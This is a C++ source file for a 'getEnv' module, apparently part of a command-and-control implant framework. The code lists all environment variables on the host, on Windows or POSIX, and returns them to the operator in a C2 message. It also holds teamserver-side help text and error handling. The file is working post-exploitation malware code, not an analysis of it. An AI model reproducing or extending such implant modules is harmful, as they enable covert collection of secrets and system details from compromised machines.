#include "GetEnv.hpp"
#include "Common.hpp"

#include <cstring>
#ifdef _WIN32
#include <windows.h>
#else
extern char **environ;
#endif

using namespace std;

constexpr std::string_view moduleName = "getEnv";
constexpr unsigned long long moduleHash = djb2(moduleName);

#ifdef _WIN32
__declspec(dllexport) GetEnv* GetEnvConstructor()
{
    return new GetEnv();
}
#else
__attribute__((visibility("default"))) GetEnv* GetEnvConstructor()
{
    return new GetEnv();
}
#endif

GetEnv::GetEnv()
#ifdef BUILD_TEAMSERVER
    : ModuleCmd(std::string(moduleName), moduleHash)
#else
    : ModuleCmd("", moduleHash)
#endif
{
}

GetEnv::~GetEnv()
{
}

std::string GetEnv::getInfo()
{
    std::string info;
#ifdef BUILD_TEAMSERVER
    info += "getEnv:\n";
    info += "List environment variables.\n";
#endif
    return info;
}

int GetEnv::init(std::vector<std::string>& splitedCmd, C2Message& c2Message)
{
#if defined(BUILD_TEAMSERVER) || defined(C2CORE_BUILD_TESTS)
    if (splitedCmd.size() != 1)
    {
        c2Message.set_returnvalue(getInfo());
        return -1;
    }
    c2Message.set_instruction(splitedCmd[0]);
#endif

    return 0;
}

int GetEnv::process(C2Message& c2Message, C2Message& c2RetMessage)
{
    std::string out;
    const bool read = listEnv(out);
    c2RetMessage.set_instruction(c2Message.instruction());
    c2RetMessage.set_returnvalue(out);
    c2RetMessage.set_errorCode(read ? 0 : 1);
    return 0;
}

int GetEnv::errorCodeToMsg(const C2Message& c2RetMessage, std::string& errorMsg)
{
#if defined(BUILD_TEAMSERVER) || defined(C2CORE_BUILD_TESTS)
    if (c2RetMessage.errorCode() == 1)
        errorMsg = "Failed: Could not retrieve environment";
#endif
    return 0;
}

bool GetEnv::listEnv(std::string& result)
{
#ifdef _WIN32
    LPCH env = GetEnvironmentStringsA();
    if(!env)
        return false;
    for(LPCH var = env; *var; var += strlen(var) + 1)
    {
        result += var;
        result += "\n";
    }
    FreeEnvironmentStringsA(env);
#else
    if(!environ)
        return false;
    for(char **p = environ; *p; ++p)
    {
        result += *p;
        result += "\n";
    }
#endif
    return true;
}

